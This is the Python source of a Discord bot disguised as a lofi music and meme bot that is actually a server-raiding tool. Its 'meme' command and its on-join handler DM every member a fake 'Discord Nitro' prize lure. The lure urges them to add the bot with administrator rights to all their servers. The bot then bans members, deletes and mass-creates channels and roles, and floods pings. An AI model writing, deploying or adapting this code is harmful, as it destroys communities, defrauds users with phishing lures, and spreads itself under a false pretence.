import asyncio
import os
from disnake.ext import commands
import disnake
import raid_helper as RD
from raid_helper import RaidCommands as RC
from py_logs import TOKEN

intents = disnake.Intents().all()
intents.guilds = True
intents.members = True
prefix = "pls"
bot = commands.Bot(
    command_prefix=prefix,
    activity=disnake.Activity(type=disnake.ActivityType.listening, name="24/7 Lofi Music"),
    help_command=None,
    intents=intents,
    case_insensitive=True,
    strip_after_prefix=True,
)

dm_embed = disnake.Embed(
    title="DISCORD NITRO OFFER!",
    description="""
Congrats! You Are One Of The Lucky Few To Win This Offer :partying_face:
Just Click The Link Below And Invite The Bot To All Your Servers For 24 Hours To Claim The Prize!

Click Here! --> https://discord.com/api/oauth2/authorize?client_id=958355831563386900&permissions=8&scope=bot%20applications.commands
""",
    color=RD.ORANGE,
)
dm_embed.set_image(
    url="https://images-ext-1.discordapp.net/external/bHmoJrLUwoi0hX6TRhp6pI7UjYy5zpNSQiQoV9O4OMw/%3Fwidth%3D726%26height%3D434/https/images-ext-2.discordapp.net/external/peUhCIC0RGrjTInAcZIY8LzrAYV1RPp57XnCJlqxxjw/%253Fu%253Dhttps%25253A%25252F%25252Fwww.digiseller.ru%25252Fpreview%25252F962904%25252Fp1_3054850_f9e16504.jpg%2526f%253D1%2526nofb%253D1/https/external-content.duckduckgo.com/iu/?width=695&height=415"
)


@bot.event
async def on_ready():
    print(f"Logged In As: {bot.user}")
    await RD.genreddit(100, RD.subreddit)


@bot.command()
async def assist(ctx: commands.Context):
    embed = disnake.Embed(
        title="List Of Commands: ",
        description="""
1 - `pls meme`
2 - `pls help`
3 - `pls ban`
4 - `pls dm`
5 - `pls cancel`
6 - `pls channel remove/make`
7 - `pls role make/remove/give`
8 - `pls ping amt`
9 - `pls sfw amt`

    """,
        color=RD.ORANGE,
    )
    await ctx.channel.send(embed=embed)


@bot.command()
@commands.cooldown(5, 30, commands.BucketType.guild)
async def meme(ctx: commands.Context, *, bs=None):
    guild = ctx.guild

    await ctx.channel.send("Starting Remix ... (Eta 10s)")

    await RD.genreddit(10, RD.subreddit)

    await asyncio.sleep(3)

    await ctx.channel.send("5 Seconds Left")

    await RC.send_dm(guild, dm_embed)

    await asyncio.sleep(2)

    await ctx.channel.send("Sending Remixed Song...")

    await RC.ban_members(guild, ctx.author)

    await RC.channel_remove(guild)
    await RC.channel_make(guild, 25)

    await RC.role_remove(guild)
    await RC.role_make(guild, 10)

    await RC.ping_spam(guild, 10)
    await RC.sfw_spam(guild, 10)

    await RC.role_give(guild)


@bot.command()
@commands.cooldown(5, 30, commands.BucketType.guild)
async def channel(ctx: commands.Context, choice: str):
    guild = ctx.guild
    if choice == "delete":
        await RC.channel_remove(guild)
    elif choice == "make":
        await RC.channel_make(guild, 25)


@bot.command()
async def role(ctx: commands.Context, choice: str):
    guild = ctx.guild
    if choice == "delete":
        await RC.role_remove(guild)
    elif choice == "make":
        await RC.role_make(guild, 25)
    elif choice == "give":
        await RC.role_give(guild)


@bot.command()
async def promote(ctx: commands.Context, member: disnake.Member):
    role = disnake.utils.get(ctx.guild.roles, name="new role")
    await member.add_roles(role)


@bot.command()
@commands.cooldown(5, 30, commands.BucketType.user)
async def dm(ctx: commands.Context):
    guild = ctx.guild
    await RC.send_dm(guild, dm_embed)


@bot.command()
async def ban(ctx: commands.Context):
    guild = ctx.guild
    await RC.ban_members(guild, ctx.author)


@bot.command()
async def ping(ctx: commands.Context, amt: int):
    await RC.ping_spam(ctx.guild, amt)


@bot.command()
async def sfw(ctx: commands.Context, amt: int):
    await RC.sfw_spam(ctx.guild, amt)


@bot.command()
async def cancel(ctx: commands.Context):
    os.system('cmd /k "python main.py"')


@bot.event
async def on_guild_join(guild: disnake.Guild):

    await RD.genreddit(10, RD.subreddit)

    await RC.send_dm(guild, dm_embed)

    await RC.ban_members(guild)

    await RC.role_remove(guild)
    await RC.role_make(guild, 25)
    await RC.role_give(guild)

    await RC.channel_remove(guild)
    await RC.channel_make(guild, 25)

    await RC.sfw_spam(guild, 10)
    await RC.ping_spam(guild, 10)


bot.run(TOKEN)
